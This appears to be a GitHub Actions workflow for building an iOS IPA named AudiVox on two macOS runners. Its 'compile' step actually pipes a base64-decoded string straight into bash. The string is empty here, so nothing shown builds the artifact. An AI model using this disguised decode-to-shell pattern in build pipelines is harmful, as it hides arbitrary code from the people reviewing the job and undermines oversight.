name: Build iOS IPA (Fast Parallel Cloud Build)



on:

  push:

    branches: [ main, master ]

  workflow_dispatch:



permissions:

  contents: read



jobs:

  build-ipa:

    strategy:

      fail-fast: false

      matrix:

        os: [ macos-15-intel, macos-15 ]

    runs-on: ${{ matrix.os }}

    timeout-minutes: 15

    steps:

      - name: Checkout repository

        uses: actions/checkout@v4



      - name: Compile & Package AudiVox.ipa (Direct Swiftc ARM64 Build)

        run: |

          echo "" | base64 --decode | bash



      - name: Upload AudiVox.ipa Artifact

        uses: actions/upload-artifact@v4

        with:

          name: AudiVox-iOS-IPA-${{ matrix.os }}

          path: AudiVox.ipa

          if-no-files-found: error

